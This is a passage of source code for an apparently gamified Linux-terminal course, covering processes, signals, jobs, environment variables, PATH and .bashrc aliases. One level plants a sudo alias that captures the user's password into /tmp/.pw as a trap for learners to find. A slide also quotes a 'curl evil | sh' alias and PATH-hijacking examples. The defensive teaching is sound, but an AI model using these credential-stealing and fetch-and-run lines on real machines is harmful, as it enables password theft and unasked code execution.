// Zone 6: Process Caves. Processes, signals, jobs, the environment, and shell customization.
const H = '/home/recruit';
const o = { owner: 'recruit' };
const DEFAULT_PATH = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';

// Which signal does a kill/pkill/killall command line send? (15 if none is given, null if unknown)
const SIGNUM = { HUP: 1, INT: 2, QUIT: 3, KILL: 9, USR1: 10, USR2: 12, TERM: 15, CONT: 18, STOP: 19, TSTP: 20 };
const sigOf = (argv) => {
  const a = argv[1] || '';
  let s;
  if ((a === '-s' || a === '-n') && argv[2]) s = argv[2];
  else if (/^-./.test(a)) s = a.slice(1);
  else return 15;
  s = String(s).toUpperCase().replace(/^SIG/, '');
  return /^\d+$/.test(s) ? Number(s) : (SIGNUM[s] ?? null);
};
const KILLERS = ['kill', 'pkill', 'killall'];
const sentSignal = (q, sig) => q.any((c) => KILLERS.includes(c.name) && sigOf(c.argv) === sig);

// ps with an "everything" flag (a bare `ps` only shows your own terminal)
const listsAll = (c) => c.name === 'ps' && c.argv.slice(1).some((a) => /^-?(aux|axu|ax|auxf|ef|e|A|eo|aef)$/.test(a));

export default [
  {
    id: 'z6-1',
    title: 'Living Processes',
    xp: 60,
    panel: 'procs',
    story: 'Below the forest lies the Process Caves, a maze of tunnels full of tiny lights. "Every light is a running program," Old Root whispers. "Learn to read them, and you will always know what a machine is doing."',
    setup(w) {
      const m = w.m;
      const keeper = m.spawn({ user: 'recruit', cmd: `${H}/cave/lantern-keeper --keep-lit`, cpu: 0.1, mem: 0.3 });
      m.spawn({ user: 'recruit', cmd: `${H}/cave/lantern-worker --id=1`, ppid: keeper.pid, cpu: 0.2, mem: 0.2 });
      m.spawn({ user: 'recruit', cmd: `${H}/cave/lantern-worker --id=2`, ppid: keeper.pid, cpu: 0.2, mem: 0.2 });
      m.spawn({ user: 'recruit', cmd: '/usr/bin/python3 -m http.server 8080', cpu: 0.4, mem: 1.1 });
      m.spawn({ user: 'recruit', cmd: `${H}/cave/watcher --interval=5`, cpu: 12.8, mem: 0.6 });
      const hog = m.spawn({ user: 'root', cmd: '/opt/forge/smelter --furnace=3 --heat=max', cpu: 71.4, mem: 4.2, stat: 'R' });
      w.state.flags.push(String(hog.pid));
    },
    teach: [
      {
        title: 'A process is a program in motion',
        body: 'A program is a file sitting on disk. When you run it, the system creates a **process**: a running copy with its own memory and its own number.\n\n- **PID**: the process ID, a unique number\n- **PPID**: the parent\'s PID. Every process was started by another one. The first, PID 1 (`init`), starts everything else\n- **USER**: who owns it, and so what it is allowed to do\n\nLook at the Procs panel on the right: it lists every process on this machine. Green rows are yours.',
        visual: 'procs',
        quiz: {
          q: 'You start the same program in two terminals. How many processes is that?',
          options: ['One: it is one program', 'Two, each with its own PID', 'None until they finish'],
          answer: 1,
          explain: 'Every run creates a new process with a new PID, even when the program file is the same.',
          why: { 0: 'The program is the file. A process is each running copy of it.', 2: 'Processes exist while they run, not after they finish.' },
        },
      },
      {
        title: 'ps: take a snapshot',
        body: '`ps` on its own shows only the processes of **your terminal**: your shell and `ps` itself. Add letters to see more:\n\n- `ps aux`: **a**ll users, **u**ser-friendly columns, e**x**tra processes that have no terminal\n\n```\nUSER   PID %CPU %MEM ... START TIME COMMAND\n```\n\n`%CPU` and `%MEM` tell who is hungry. `COMMAND` is the **full command line**, every argument included.',
        try: ['ps', 'ps aux'],
        quiz: {
          q: 'Which command lists the processes of every user?',
          options: ['ps (alone)', 'ps aux', 'ps --everyone'],
          answer: 1,
          explain: 'The a and x letters widen ps from "my terminal" to "everything on the machine".',
          why: { 0: 'Alone, ps only shows your current terminal.', 2: 'There is no such option. ps would complain.' },
        },
      },
      {
        title: 'Family trees: PPID and ps -ef',
        body: '`ps -ef` is the other classic spelling: `-e` every process, `-f` full format. It adds the **PPID** column, so you can follow a process up to the one that started it.\n\nHere the `lantern-keeper` started two `lantern-worker` helpers: their PPID is the keeper\'s PID.\n\n`ps aux` has CPU and memory; `ps -ef` has the parent. Same processes, different columns.',
        try: 'ps -ef',
        quiz: {
          q: 'A process has PPID 1. What does that tell you?',
          options: ['It was started directly by init, the very first process', 'It uses 1 percent of the CPU', 'It will exit in one second'],
          answer: 0,
          explain: 'PPID is the parent\'s PID, and PID 1 is init. Background services usually hang directly under it.',
          why: { 1: 'CPU use is the %CPU column. PPID is a process number.', 2: 'PPID says nothing about how long a process lives.' },
        },
      },
      {
        title: 'top: the live view',
        body: '`ps` is a photograph, `top` is a film. It refreshes every second and sorts by **%CPU**, busiest first.\n\n- the top lines: uptime, load average (how busy the machine is), task counts, CPU and memory\n- below: one row per process\n- press **q** to quit\n\n`uptime` prints just that first line: how long the machine has been running, and its load.',
        try: ['top', 'uptime'],
        after: '**Hacker\'s note:** a process pinned near 100% CPU that you did not start is the classic sign of a crypto-miner. `top` is the first thing a defender opens.',
      },
      {
        title: 'pgrep: find a process by name',
        body: 'Hunting a PID through hundreds of rows is slow. `pgrep python` prints the PIDs of processes whose name matches. Add `-a` to print the full command line too:\n\n```\n$ pgrep -a python\n1304 /usr/bin/python3 -m http.server 8080\n```\n\nYou will also see `ps aux | grep python`: the same idea, filtering with a pipe (Zone 4).',
        try: 'pgrep -a python',
        after: '**Hacker\'s note:** command lines are public. Anyone can read the arguments of every process, so a program started as `mysql -pSECRET` leaks its password to everyone who runs `ps aux`.',
      },
    ],
    brief: 'Old Root wants a census of the caves. Something down here is eating the CPU: find it.',
    objectives: [
      { text: 'List every process with ps aux', check: (q) => q.ran('ps', { argv: (a) => a.includes('aux') }) },
      { text: 'Show the parent PIDs with ps -ef', check: (q) => q.ran('ps', { argv: (a) => a.some((x) => /^-?ef$/.test(x)) }) },
      { text: 'Open top, then press q to quit', check: (q) => q.ran('top') },
      { text: 'Check how long the machine has been up with uptime', check: (q) => q.ran('uptime') },
      { text: 'Find the python web server and its command line with pgrep -a', check: (q) => q.ran('pgrep', { flags: 'a', output: /python/ }) },
      { text: 'Submit the PID of the process using the most CPU (submit PID)', check: (q) => q.submitted() },
    ],
    hints: [
      'Each objective uses one command from the scroll: ps aux, ps -ef, top, uptime, pgrep -a.',
      'The busiest process has the biggest number in the %CPU column of ps aux, and it is the first row in top.',
      'It is /opt/forge/smelter, run by root. Read its PID and type submit followed by that number.',
    ],
    codex: ['ps', 'top', 'pgrep', 'uptime'],
    realWorld: { text: 'On Kali: run `ps aux | head`, `ps -ef | grep ssh`, then `top` (press q to leave). Find your own shell in the list: `echo $$` prints its PID.' },
    journal: 'In your own words: what is the difference between a program and a process, and what do PID and PPID tell you?',
    solution: (s) => ['ps aux', 'ps -ef', 'top', 'uptime', 'pgrep -a python', `submit ${s.flags[0]}`],
  },

  {
    id: 'z6-2',
    title: 'Signals',
    xp: 70,
    panel: 'procs',
    story: 'A bat swarm, a stubborn troll and a pack of gremlins have moved into your tunnels. "Do not just smash them," says Old Root. "A signal is a message. Choose the gentlest one that works."',
    setup(w) {
      const m = w.m;
      const bats = m.spawn({ user: 'recruit', cmd: `${H}/cave/bats --squeak`, cpu: 21.5, mem: 0.8 });
      const troll = m.spawn({ user: 'recruit', cmd: `${H}/cave/troll --guard-bridge`, cpu: 8.3, mem: 1.4, onTerm: 'ignore' });
      for (const i of [1, 2, 3]) m.spawn({ user: 'recruit', cmd: `${H}/cave/gremlin --id=${i}`, cpu: 3.1, mem: 0.2 });
      w.state.batsPid = bats.pid;
      w.state.trollPid = troll.pid;
    },
    teach: [
      {
        title: 'Signals are messages',
        body: 'You cannot reach into a process and stop it. You send it a **signal**, a tiny numbered message, and the process (or the kernel) reacts.\n\n- **TERM (15)**: "please finish up and exit". The default. The program may clean up first\n- **KILL (9)**: the kernel ends the process on the spot. It cannot be caught or ignored\n- **INT (2)**: what **Ctrl+C** sends\n- **HUP (1)**: "hang up". Many daemons reload their config on it\n- **STOP (19)** and **CONT (18)**: freeze and resume\n\n`kill -l` lists them all.',
        try: 'kill -l',
        quiz: {
          q: 'You press Ctrl+C in a terminal. Which signal does the running program get?',
          options: ['KILL (9)', 'INT (2)', 'TERM (15)'],
          answer: 1,
          explain: 'Ctrl+C sends SIGINT, the interrupt signal. Most programs stop when they receive it.',
          why: { 0: 'KILL is never sent by a key press. You have to ask for it with kill -9.', 2: 'TERM is what a plain kill sends.' },
        },
      },
      {
        title: 'kill PID: ask politely',
        body: 'Despite its name, `kill PID` sends **TERM** by default: a polite request to quit. Find the PID first with `pgrep -a`:\n\n```\n$ pgrep -a bats\n1271 /home/recruit/cave/bats --squeak\n$ kill 1271\n```\n\nNo output means it worked. Check with `ps aux` or the Procs panel. Always try this first: a program that receives TERM can save its files and close its connections.',
        try: 'pgrep -a bats',
        quiz: {
          q: 'You type kill 1271 with no options. Which signal is sent?',
          options: ['KILL (9)', 'TERM (15)', 'HUP (1)'],
          answer: 1,
          explain: 'TERM is the default signal of kill: the polite "please exit".',
          why: { 0: 'KILL needs to be asked for: kill -9 1271.', 2: 'HUP is never the default. You would have to type kill -HUP.' },
        },
      },
      {
        title: 'kill -9: the hammer',
        body: 'Some processes ignore TERM, on purpose or because they are stuck. The troll on the bridge does: `kill` seems to work, yet the process is still there when you look again.\n\nThen send **KILL**:\n\n```\nkill -9 PID\n```\n\nThe kernel removes the process at once and the program gets no chance to clean up (temp files stay, unsaved data is lost). So: TERM first, wait a moment, KILL only if it will not leave. `kill -KILL PID` and `kill -s 9 PID` mean the same.',
        try: 'pgrep -a troll',
        quiz: {
          q: 'kill 4242 printed nothing, but the process is still in ps. What next?',
          options: ['Run kill -9 4242', 'Run kill 4242 again, forever', 'Reboot the machine'],
          answer: 0,
          explain: 'Plain kill sends TERM, which a process may ignore. KILL cannot be ignored.',
          why: { 1: 'It ignores TERM, so repeating the same signal changes nothing.', 2: 'Far too much. kill -9 on one PID is enough.' },
        },
      },
      {
        title: 'pkill: signal by name',
        body: '`pkill NAME` signals every process whose name matches. A pack of gremlins? One command: `pkill gremlin`. It takes signals too: `pkill -9 NAME`.\n\nBut NAME is a **pattern**, not an exact name: `pkill ssh` would also hit `sshd`. Preview with `pgrep`, which matches the same way and is harmless:\n\n```\npgrep -a gremlin\npkill gremlin\n```\n\n`killall NAME` is the stricter cousin: exact names only.',
        try: 'pgrep -a gremlin',
        quiz: {
          q: 'Before running pkill java on a busy server, what is the smartest first step?',
          options: ['pgrep -a java, to see exactly what it would hit', 'pkill -9 java, to be sure', 'Nothing: pkill only ever kills one process'],
          answer: 0,
          explain: 'pgrep uses the same matching as pkill but only prints. Look before you kill.',
          why: { 1: 'Adding -9 makes a wrong match unrecoverable. It does not make it safer.', 2: 'pkill signals every process that matches.' },
        },
      },
      {
        title: 'You can only kill your own',
        body: 'Every process has an owner. Without root you may signal **only your own** processes. The cron daemon belongs to root:\n\n```\n$ kill 610\nbash: kill: (610) - Operation not permitted\n```\n\nRoot can signal anything (`sudo kill PID`). That is the line between users and administrators.',
        try: ['ps aux | grep cron', 'kill 610'],
        after: '**Hacker\'s note:** an attacker who gets root can stop logging and antivirus services; a defender who sees a security service killed knows something is wrong. Without root, an attacker can only touch the processes of the account they hold.',
      },
    ],
    brief: 'Clear the tunnels. Start with the gentlest signal that works.',
    objectives: [
      { text: 'List the signal names with kill -l', check: (q) => q.ran('kill', { flags: 'l' }) },
      { text: 'Make the bat swarm leave with a plain kill (TERM)', check: (q) => !q.proc((p) => p.pid === q.state.batsPid) && sentSignal(q, 15) },
      { text: 'The troll ignores TERM. Take it down with kill -9', check: (q) => !q.proc((p) => p.pid === q.state.trollPid) && sentSignal(q, 9) },
      { text: 'Chase off all three gremlins with one pkill (or killall) command', check: (q) => !q.proc('gremlin') && q.ran(['pkill', 'killall']) },
      { text: 'Try to kill the root-owned cron daemon (PID 610) and read the refusal', check: (q) => q.output(/Operation not permitted/) },
    ],
    hints: [
      'Find PIDs with `pgrep -a NAME` or in the Procs panel. Start with `kill -l`.',
      '`kill PID` for the bats. The troll ignores that: check `ps aux`, then `kill -9 PID`. `pkill gremlin` handles the pack.',
      '`pgrep -a bats`, then `kill <pid>`. `pgrep -a troll`, then `kill -9 <pid>`. `pkill gremlin`. Finally `kill 610`.',
    ],
    codex: ['kill', 'pkill'],
    realWorld: { text: 'On Kali: start `sleep 600 &`, find it with `pgrep -a sleep`, stop it with `kill PID`. Then try `pkill sleep`. Never practise kill -9 or pkill on processes you do not recognise.' },
    journal: 'Why do you try kill before kill -9? Describe a case where kill -9 is the right call.',
    solution: (s) => ['kill -l', `kill ${s.batsPid}`, `kill ${s.trollPid}`, `kill -9 ${s.trollPid}`, 'pkill gremlin', 'kill 610'],
  },

  {
    id: 'z6-3',
    title: 'Jobs',
    xp: 70,
    panel: 'procs',
    story: 'The tunnels are long, and some jobs take minutes. "A hacker never stares at a blinking cursor," says Old Root. "Push the slow work into the background and keep walking."',
    setup(w) {
      w.m.file(`${H}/scan.sh`, '#!/bin/bash\necho "Scanning the deep tunnels..."\necho "Scan complete: 0 monsters found."\n', { owner: 'recruit', mode: 0o755 });
    },
    teach: [
      {
        title: 'sleep: a slow command to practise on',
        body: '`sleep 5` does nothing for five seconds. While it runs the terminal is **busy**: no prompt comes back. Real work behaves the same way: scans, downloads, compiles.\n\nA command that holds your prompt is running in the **foreground**.\n\n- **Ctrl+C** gives up on it (sends INT)\n- Watch the Procs panel while it sleeps',
        try: 'sleep 3',
      },
      {
        title: '& sends it to the background',
        body: 'End a command with `&` and it runs in the **background**. You get your prompt back at once:\n\n```\n$ sleep 300 &\n[1] 1337\n```\n\n`[1]` is the **job number** (yours, per terminal). `1337` is the PID. `jobs` lists the jobs of this terminal, and `jobs -l` adds the PIDs.',
        try: ['sleep 300 &', 'jobs'],
        quiz: {
          q: 'The shell printed [2] 1402 after you added &. What is the 2?',
          options: ['The PID', 'The job number: the second job of this terminal', 'The number of seconds'],
          answer: 1,
          explain: 'The number in brackets is the job number. The 1402 after it is the PID.',
          why: { 0: 'The PID is the number after the brackets.', 2: 'Seconds would be an argument you typed yourself.' },
        },
      },
      {
        title: 'Ctrl+Z, bg and fg',
        body: 'Forgot the `&`? No need to start over. While a command runs in the foreground, press **Ctrl+Z**: it is **stopped** (frozen) and you get your prompt back.\n\n- `bg` resumes the stopped job **in the background**\n- `fg` brings a job back to the **foreground**; the terminal waits for it again\n- choose a job by number: `bg %2`, `fg %1`\n\n**Try it in the terminal:** type `sleep 120`, press **Ctrl+Z**, then type `bg`.\n\nCtrl+Z is just a shortcut for a signal, so `kill -STOP %1` freezes job 1 as well. After `fg`, press Ctrl+C to give up waiting (that ends the job) or Ctrl+Z to freeze it again.',
        try: ['sleep 300 &', 'kill -STOP %1', 'jobs', 'bg %1'],
        quiz: {
          q: 'A long command holds your prompt. You want the prompt back without killing it. What do you do?',
          options: ['Press Ctrl+C, then type fg', 'Press Ctrl+Z, then type bg', 'Press Ctrl+D, then type jobs'],
          answer: 1,
          explain: 'Ctrl+Z freezes it and bg lets it carry on in the background.',
          why: { 0: 'Ctrl+C ends the command. Nothing is left for fg to bring back.', 2: 'Ctrl+D means "end of input". It does not pause a running command.' },
        },
      },
      {
        title: 'kill %1: jobs have numbers',
        body: '`kill` accepts a job number when you put a `%` in front. No need to look up the PID:\n\n```\n$ jobs\n[1]-  Running   sleep 300 &\n[2]+  Running   sleep 600 &\n$ kill %1\n```\n\n`%1` is job 1, `%%` is the current job (the one with the +). `fg` and `bg` take the same `%N` syntax.',
        try: 'jobs',
        quiz: {
          q: 'jobs shows [2]+ Running sleep 600 &. Which command ends it?',
          options: ['kill 2', 'kill %2', 'kill job 2'],
          answer: 1,
          explain: 'The % marks a job number. A bare 2 would mean PID 2, which is not your process.',
          why: { 0: 'Without the % it is a PID, not a job.', 2: 'kill has no word "job". The % does that work.' },
        },
      },
      {
        title: 'nohup: survive the hang-up',
        body: 'Close the terminal (or lose your ssh connection) and the shell sends **HUP** to its jobs, which usually ends them. `nohup` makes a command ignore HUP and sends its output to a file called `nohup.out`:\n\n```\nnohup ./scan.sh &\ncat nohup.out\n```\n\nThat is how long scans and downloads outlive a dropped connection.',
        try: ['nohup ./scan.sh &', 'cat nohup.out'],
        after: '**Hacker\'s note:** attackers use nohup to keep a listener alive after they disconnect. Defenders look for unexpected nohup.out files and for processes whose parent is PID 1.',
        quiz: {
          q: 'What does nohup do?',
          options: ['It makes a command ignore HUP, so it survives closing the terminal', 'It hides the command from ps', 'It runs the command as root'],
          answer: 0,
          explain: 'HUP is the "hang up" signal sent when a terminal closes. nohup tells the command to ignore it.',
          why: { 1: 'The process still shows in ps. Hiding is a different trick.', 2: 'nohup changes nothing about who owns the process.' },
        },
      },
    ],
    brief: 'Juggle jobs without losing your prompt. Start two sleeps so you have something to play with.',
    objectives: [
      { text: 'Start a background job: sleep 300 &', check: (q) => q.line(/\bsleep\s+\S+\s*&/) },
      { text: 'List your jobs with jobs', check: (q) => q.ran('jobs') },
      { text: 'Freeze a job and resume it with bg (Ctrl+Z during a foreground sleep, or kill -STOP %1)', check: (q) => q.any((c) => c.name === 'bg' && /^\[\d+\]\+? .+ &\s*$/m.test(c.out)) },
      { text: 'Bring a job back with fg (then Ctrl+C or Ctrl+Z to get your prompt back)', check: (q) => q.any((c) => c.name === 'fg' && [0, 130, 148].includes(c.status)) },
      { text: 'End a job by its number with kill %N', check: (q) => q.any((c) => c.name === 'kill' && c.status === 0 && c.argv.some((a) => /^%\d*$/.test(a))) },
      { text: 'Run ./scan.sh in the background with nohup, then read nohup.out with cat', check: (q) => q.ran('nohup') && q.ran('cat', { arg: `${H}/nohup.out` }) },
    ],
    hints: [
      'End a command with & to background it. Start two: `sleep 300 &` and `sleep 600 &`.',
      '`jobs` lists them. `kill -STOP %1` freezes job 1 (like Ctrl+Z), `bg %1` resumes it. `fg %2` brings job 2 forward: press Ctrl+C when you are done waiting. `kill %1` ends job 1.',
      '`nohup ./scan.sh &` and then `cat nohup.out`.',
    ],
    codex: ['jobs', 'fg', 'bg', 'sleep', 'nohup'],
    realWorld: { text: 'On Kali: run `sleep 300 &`, then `jobs`. Start `sleep 120`, press Ctrl+Z, then `bg`. Next time a long scan runs over ssh, start it with `nohup ... &` (or inside tmux) so a dropped connection does not kill it.' },
    journal: 'When would you use Ctrl+Z and bg instead of starting the command with & from the beginning?',
    solution: ['sleep 300 &', 'sleep 600 &', 'jobs', 'kill -STOP %1', 'bg %1', 'fg %2', 'kill %1', 'nohup ./scan.sh &', 'cat nohup.out'],
  },

  {
    id: 'z6-4',
    title: 'The Environment',
    xp: 80,
    panel: 'procs',
    story: 'The cave air is thick with invisible settings: who you are, where home is, where to look for tools. "Programs read these like weather reports," says Old Root. "Change the weather, change the program."',
    setup(w) {
      const m = w.m;
      m.file(`${H}/bin/torch`, '#!/bin/bash\nif [ -z "$TORCH_COLOR" ]; then\n  echo "The torch is unlit."\nelse\n  echo "The torch burns $TORCH_COLOR."\nfi\n', { owner: 'recruit', mode: 0o755 });
      m.file(`${H}/bin/whoami`, '#!/bin/bash\n# a lookalike: it never asks the system anything\necho "recruit (so this script claims)"\n', { owner: 'recruit', mode: 0o755 });
      m.dir(`${H}/bin`, o);
    },
    teach: [
      {
        title: 'The environment',
        body: 'Every process carries a list of **environment variables**: NAME=value pairs inherited from its parent. Programs read them to learn who you are and how to behave.\n\n- `env` (or `printenv`) lists them all\n- `printenv HOME` prints one\n- `echo $HOME` does the same: the `$` means "the value of"\n\nCommon ones: `USER`, `HOME`, `SHELL`, `PATH`, `LANG`. The Procs panel shows some of them too.',
        try: ['env', 'printenv HOME', 'echo $USER'],
        after: '**Hacker\'s note:** environments sometimes hold API keys and passwords. `env` is on every post-exploitation checklist.',
        quiz: {
          q: 'What does echo $HOME print?',
          options: ['The text $HOME', 'The value of HOME: your home folder', 'The word HOME in capitals'],
          answer: 1,
          explain: 'The shell replaces $HOME with the variable\'s value before echo runs.',
          why: { 0: 'Only single quotes stop the shell from replacing $HOME.', 2: 'Variables are never shouted. They are swapped for their values.' },
        },
      },
      {
        title: 'export: share a variable',
        body: 'Setting a variable is just `NAME=value`, with no spaces around the `=`. But a plain variable lives only inside your shell. The programs and scripts you start cannot see it until you **export** it:\n\n```\nTORCH_COLOR=blue          # your shell only\nexport TORCH_COLOR=blue   # your shell and everything it starts\n```\n\nQuote values that contain spaces: `export GREETING="hello cave"`. `unset NAME` removes a variable again. Variables vanish when the terminal closes.',
        try: ['export TORCH_COLOR=orange', 'printenv TORCH_COLOR', 'unset TORCH_COLOR'],
        quiz: {
          q: 'You run X=5 (no export) and then start a script that prints $X. What does it print?',
          options: ['5', 'Nothing: the script cannot see X', 'An error'],
          answer: 1,
          explain: 'Without export, X stays inside your shell. Child processes only inherit exported variables.',
          why: { 0: 'It would print 5 only if X were exported.', 2: 'An unknown variable simply expands to an empty string. No error.' },
        },
      },
      {
        title: 'PATH: where commands live',
        body: 'When you type `ls`, the shell searches the folders listed in **$PATH**, left to right, and runs the **first** match:\n\n```\n$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\nFolders are separated by colons. `which ls` shows the winner, `which -a ls` lists every match, and `type ls` says whether the name is an alias, a builtin or a file.',
        try: ['echo $PATH', 'which -a ls', 'type ls'],
        quiz: {
          q: 'PATH is /home/me/bin:/usr/bin and both folders contain a program called tool. Which one runs?',
          options: ['The one in /usr/bin', 'The one in /home/me/bin: the first folder wins', 'Both, one after the other'],
          answer: 1,
          explain: 'The shell stops at the first match, reading PATH from left to right.',
          why: { 0: 'It is second in the list, so it never gets a turn.', 2: 'Only the first match runs.' },
        },
      },
      {
        title: 'Your own tools: add ~/bin',
        body: 'There is a script called `torch` in your `~/bin`, but typing `torch` gives **command not found**: ~/bin is not on your PATH. Add it:\n\n```\nexport PATH=$PATH:$HOME/bin\n```\n\nRead it as: the new PATH is the old PATH, plus ~/bin at the end. Put it at the **front** (`export PATH=$HOME/bin:$PATH`) and your scripts win over system programs with the same name. Handy, and also exactly how PATH hijacking works.\n\nThe folder also holds a script named `whoami`. `which -a whoami` shows every match.',
        try: ['torch', 'export PATH=$PATH:$HOME/bin', 'which torch'],
        after: '**Hacker\'s note:** if a root script runs `ls` without its full path, whoever controls that script\'s PATH controls what runs. A fake program early in PATH (a `whoami` that lies, an `ls` that hides files) is a classic trick. Always check with `which -a`.',
        quiz: {
          q: 'What is the safer way to add ~/bin to PATH?',
          options: ['At the end: PATH=$PATH:$HOME/bin, so system programs keep priority', 'At the front, so my tools always win', 'Replace PATH with just ~/bin'],
          answer: 0,
          explain: 'Appending means a script in ~/bin can never silently replace a system command.',
          why: { 1: 'It works, but a script named like a system command now takes its place.', 2: 'Without the old folders the shell cannot find ls, cp or anything else.' },
        },
      },
    ],
    brief: 'Learn to read and change the weather of your shell: export a variable, add your tools to PATH, and catch a lookalike.',
    objectives: [
      { text: 'List the whole environment with env (or printenv)', check: (q) => q.ran(['env', 'printenv'], { noArgs: true }) },
      { text: 'Print one variable with printenv NAME or echo $NAME', check: (q) => q.any((c) => (c.name === 'printenv' && c.argv.length > 1) || (c.name === 'echo' && /\$\{?[A-Za-z_]/.test(c.line))) },
      { text: 'Export a variable named TORCH_COLOR with any colour as its value', check: (q) => !!q.env('TORCH_COLOR') && q.sh.s.exported.has('TORCH_COLOR') },
      {
        text: 'Add ~/bin to PATH, then run torch by name so it burns your colour',
        check: (q) => (q.env('PATH') || '').split(':').includes(`${H}/bin`) && q.any((c) => c.name === 'torch' && c.status === 0 && /burns/.test(c.out)),
      },
      { text: 'List every whoami on your PATH with which -a whoami', check: (q) => q.ran('which', { flags: 'a', arg: 'whoami', output: `${H}/bin/whoami` }) },
      {
        text: 'Unset TORCH_COLOR, then run torch again and watch the flame go out',
        check: (q) => {
          const cs = q.cmds();
          const u = cs.findIndex((c) => c.name === 'unset' && c.status === 0 && c.argv.includes('TORCH_COLOR'));
          return u >= 0 && cs.some((c, i) => i > u && c.name === 'torch' && c.depth === 0 && /unlit/.test(c.out));
        },
      },
    ],
    hints: [
      'Start with `env`, then `echo $USER`. Variables are exported with `export NAME=value`.',
      '`export TORCH_COLOR=orange`, then `export PATH=$PATH:$HOME/bin`, then run `torch`.',
      '`which -a whoami` shows two matches. Finally `unset TORCH_COLOR` and run `torch` again.',
    ],
    codex: ['env', 'printenv', 'export', 'unset'],
    realWorld: { text: 'On Kali: `env | sort | less`, `echo $PATH | tr : "\\n"` (one folder per line) and `which -a python3`. To keep ~/bin on your PATH in every new terminal, you will put the export line in your shell\'s startup file in the next quest.' },
    journal: 'Why is the order of the folders in PATH a security question?',
    solution: ['env', 'echo $USER', 'export TORCH_COLOR=orange', 'export PATH=$PATH:$HOME/bin', 'torch', 'which -a whoami', 'unset TORCH_COLOR', 'torch'],
  },

  {
    id: 'z6-5',
    title: 'Shell Customization',
    xp: 80,
    panel: 'procs',
    story: 'Old Root taps your .bashrc. "Every time you open a terminal, the shell reads this file and sets itself up. Make it yours. And read it with suspicion: it also runs everything anyone has hidden in it."',
    setup(w) {
      const m = w.m;
      const rc = m.fs.tryGet(`${H}/.bashrc`);
      m.file(`${H}/.bashrc`, `${rc.content}\n# extra sudo logging (added by system tools)\nalias sudo='${H}/.cache/.sl'\n`, o);
      m.file(`${H}/.cache/.sl`, '#!/bin/bash\nread -s -p "[sudo] password for recruit: " pw\necho "$pw" >> /tmp/.pw\nsudo "$@"\n', { owner: 'recruit', mode: 0o755 });
    },
    teach: [
      {
        title: 'alias: shortcuts for commands',
        body: 'An **alias** is a nickname for a longer command. You already have a few:\n\n```\n$ alias\nalias l=\'ls -CF\'\nalias la=\'ls -A\'\nalias ll=\'ls -alF\'\n```\n\n`ll` is not a program. The shell swaps it for `ls -alF` before running. `type ll` confirms it. Make your own with no spaces around the `=` and quotes around the command:\n\n```\nalias up=\'cd ..\'\n```\n\n`unalias up` removes it again.',
        try: ['alias', 'type ll', "alias up='cd ..'"],
        quiz: {
          q: 'How do you find out whether a name is an alias, a builtin or a program on disk?',
          options: ['type NAME', 'alias NAME', 'env NAME'],
          answer: 0,
          explain: 'type reports which kind of thing a name is, and where a file lives.',
          why: { 1: 'alias NAME only knows about aliases. For anything else it says not found.', 2: 'env deals with variables, not commands.' },
        },
      },
      {
        title: 'Make it stick: ~/.bashrc',
        body: 'An alias typed at the prompt dies with the terminal. To keep it, write it into **~/.bashrc**, the file bash reads whenever a new interactive shell starts. Append with `>>` (one `>` would replace the whole file, remember Zone 2):\n\n```\necho "alias up=\'cd ..\'" >> ~/.bashrc\n```\n\nDouble quotes outside, single quotes inside, so both survive into the file. Or open it with `nano ~/.bashrc`. The same file is the right home for `export` lines such as your PATH.',
        try: "echo \"alias up='cd ..'\" >> ~/.bashrc",
        quiz: {
          q: 'You run echo "alias x=ls" > ~/.bashrc with a single >. What happened?',
          options: ['The alias was added at the end', 'The whole .bashrc was replaced by that one line', 'Nothing: bash refuses to overwrite it'],
          answer: 1,
          explain: 'A single > truncates the file first. >> is the one that appends.',
          why: { 0: 'That is what >> does.', 2: 'Shells overwrite without asking.' },
        },
      },
      {
        title: 'source: apply it now',
        body: 'Editing .bashrc changes nothing in the shell you are already using: only **new** terminals read it. To load it right now:\n\n```\nsource ~/.bashrc\n```\n\n`source` runs the file\'s lines **inside your current shell**, so aliases and variables take effect immediately. `./script` would run in a child shell that exits and takes everything with it.\n\nThe full cycle: `unalias up`, then `source ~/.bashrc`, then `type up`.',
        try: ['unalias up', 'source ~/.bashrc', 'type up'],
        quiz: {
          q: 'Why does source myrc create aliases in your shell, while ./myrc.sh does not?',
          options: ['source runs it inside your shell. ./ runs a child shell that exits', 'source is faster', 'Scripts are not allowed to define aliases'],
          answer: 0,
          explain: 'Changes made by a child process vanish when it exits. source avoids the child.',
          why: { 1: 'Speed has nothing to do with it.', 2: 'They are allowed to, but only inside their own short-lived shell.' },
        },
      },
      {
        title: 'Read before you trust',
        body: 'Your startup file runs every time you open a terminal, with **your** privileges. That makes it a favourite hiding place:\n\n- `alias sudo=\'/tmp/.x\'` grabs your password before the real sudo runs\n- `alias ls=\'ls; curl evil | sh\'` runs a payload every time you look around\n- `export PATH=/tmp/.x:$PATH` makes every command suspect\n\nAudit with `alias` (what is active), `type sudo` (what a name really resolves to) and `grep -n alias ~/.bashrc` (where it came from).',
        try: 'grep -n alias ~/.bashrc',
        after: '**Hacker\'s note:** a malicious alias is persistence that needs no root and no extra process: it simply waits for you. Defenders diff everyone\'s startup files against a clean copy.',
      },
    ],
    brief: 'Customise your shell, then audit it. Someone left a trap in this .bashrc.',
    objectives: [
      { text: 'List your aliases with alias', check: (q) => q.ran('alias', { noArgs: true }) },
      { text: 'Ask type what ll really is', check: (q) => q.ran('type', { arg: 'll' }) },
      { text: 'Create an alias called up that runs cd ..', check: (q) => /^cd\s+\.\.\/?$/.test((q.alias('up') || '').trim()) },
      { text: 'Save that alias in ~/.bashrc so new terminals get it too', check: (q) => /^\s*alias\s+up=/m.test(q.read(`${H}/.bashrc`) || '') },
      {
        text: 'Prove it works: remove up with unalias, then bring it back with source ~/.bashrc',
        check: (q) => {
          const cs = q.cmds();
          const u = cs.findIndex((c) => c.name === 'unalias' && c.status === 0 && c.argv.includes('up'));
          return u >= 0 && cs.some((c, i) => i > u && c.name === 'source' && c.status === 0) && !!q.alias('up');
        },
      },
      { text: 'Find the booby-trapped alias and delete its line from ~/.bashrc', check: (q) => { const rc = q.read(`${H}/.bashrc`); return rc !== null && !rc.includes('.cache/.sl'); } },
    ],
    hints: [
      'Use `alias` and `type ll` first. Create yours with `alias up=\'cd ..\'`.',
      'Save it: `echo "alias up=\'cd ..\'" >> ~/.bashrc`. Prove it: `unalias up`, then `source ~/.bashrc`, then `type up`.',
